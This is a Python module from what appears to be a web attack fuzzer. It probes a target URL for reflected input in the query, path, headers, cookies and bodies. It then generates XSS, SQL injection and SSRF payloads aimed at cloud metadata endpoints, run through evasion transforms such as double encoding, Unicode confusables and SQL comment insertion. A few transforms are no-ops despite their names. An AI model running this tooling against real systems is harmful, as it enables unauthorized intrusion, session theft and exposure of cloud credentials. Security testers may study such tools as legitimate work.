from __future__ import annotations
import urllib.parse, random
from typing import List, Dict

try:
    from op_fuzz.grammar import gql_variants
except Exception:
    def gql_variants() -> List[str]:
        return ["query{__typename}"]

XSS  = ['"><svg/onload=alert(1)>', '<script>alert(1)</script>']
SQLI = ["' OR 1=1 --", "') UNION SELECT NULL --"]
SSRF = ["http://169.254.169.254/", "http://metadata.google.internal/"]
MARK = "WARPRECONMARK_"

def identity(p: str) -> str: return p
def double_encode(p: str) -> str: return urllib.parse.quote_plus(urllib.parse.quote_plus(p))
def quote_flip(p: str) -> str: return p.replace("'", '"').replace('"', "'")
def split_keywords(p: str) -> str: return p.replace("select", "se" + "lect").replace("union", "un" + "ion")
def case_flip(p: str) -> str: return ''.join([c.swapcase() if c.isalpha() else c for c in p])
def param_spread(p: str) -> str: return p
def unicode_confuse(p: str) -> str:
    table = str.maketrans({
        '/':  '\u2044','=':  '\uff1d',':':  '\ufe55','?':  '\ufe56','&':  '\uff06',"'":  '\u02bc','"':  '\u201f',
    })
    return p.translate(table)
# new transforms
def urlenc(p: str) -> str: return urllib.parse.quote(p, safe="")
def urlenc_all(p: str) -> str: return urllib.parse.quote(p, safe="")  # strong encode
def comment_break(p: str) -> str: return p.replace(" ", "/**/")
def param_pollution(p: str) -> str: return p + "&dup=" + urllib.parse.quote_plus(p)
def html_entity(p: str) -> str:
    return p.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;").replace('"',"&quot;").replace("'","&#39;")

TRANSFORMS = {
    "identity": identity,
    "double_encode": double_encode,
    "quote_flip": quote_flip,
    "split_keywords": split_keywords,
    "gql_variants": identity,
    "case_flip": case_flip,
    "param_spread": param_spread,
    "unicode_confuse": unicode_confuse,
    "urlenc": urlenc,
    "urlenc_all": urlenc_all,
    "comment_break": comment_break,
    "param_pollution": param_pollution,
    "html_entity": html_entity,
}

async def probe_positions(url: str) -> list[dict]:
    import httpx
    out: list[dict] = []
    MARKER = MARK
    async with httpx.AsyncClient(follow_redirects=True) as client:
        try:
            r0 = await client.get(url, timeout=8)
            base_len = len(r0.text or "")
        except Exception:
            base_len = 0
        tests = [
            ("query","q", url + ("&" if "?" in url else "?") + "q="+MARKER, None, None),
            ("path",None, url.rstrip("/")+"/"+MARKER+"/", None, None),
            ("header","X-Debug-Marker", url, {"X-Debug-Marker": MARKER}, None),
            ("cookie","dbg", url, None, {"dbg": MARKER}),
        ]
        for loc,param,u,headers,cookies in tests:
            try:
                r = await client.get(u, headers=headers, cookies=cookies, timeout=8)
                if MARKER.lower() in (r.text or "").lower() or abs(len(r.text or "")-base_len)>30:
                    out.append({"location":loc,"param":param})
            except Exception:
                pass
        for loc,param,body in [("form","q",{"q":MARKER}),("json","q",{"q":MARKER})]:
            try:
                if loc=="form":
                    r = await client.post(url, data=body, timeout=8)
                else:
                    r = await client.post(url, json=body, timeout=8)
                if MARKER.lower() in (r.text or "").lower() or abs(len(r.text or "")-base_len)>30:
                    out.append({"location":loc,"param":param})
            except Exception:
                pass
    return out

def generate_candidates(target: str, arm: dict, per_target: int, transforms: list[str]) -> list[dict]:
    out: list[dict] = []
    tfs = [TRANSFORMS.get(t, identity) for t in transforms]
    def add(mode: str, loc: str, param: str|None, base_payloads: list[str]):
        for p in base_payloads:
            for tf in tfs:
                out.append({"mode":mode,"location":loc,"param":param,"payload":tf(p),"transform":tf.__name__})
    mode = arm.get("mode"); proto = arm.get("protocol")
    if mode == "xss": add(mode, "query", "q", XSS)
    elif mode == "sqli": add(mode, "query", "id", SQLI)
    elif mode == "ssrf":
        for p in SSRF:
            for h in ["X-Forwarded-For","X-Forwarded-Host","X-Original-URL","X-Host"]:
                for tf in tfs:
                    out.append({"mode":"ssrf","location":"header","param":h,"payload":tf(p),"transform":tf.__name__})
    if proto == "graphql":
        for q in gql_variants():
            out.append({"mode":"gql","location":"body","payload":q,"variables":{"x":"1"},"transform":"gql_variant"})
    elif proto == "ws":
        out.append({"mode":"ws","location":"message","payload":"[\"ping\"]","transform":"identity"})
    elif proto == "grpc":
        out.append({"mode":"grpc","location":"body","payload":"<stub>","transform":"identity"})
    random.shuffle(out)
    return out[:per_target]
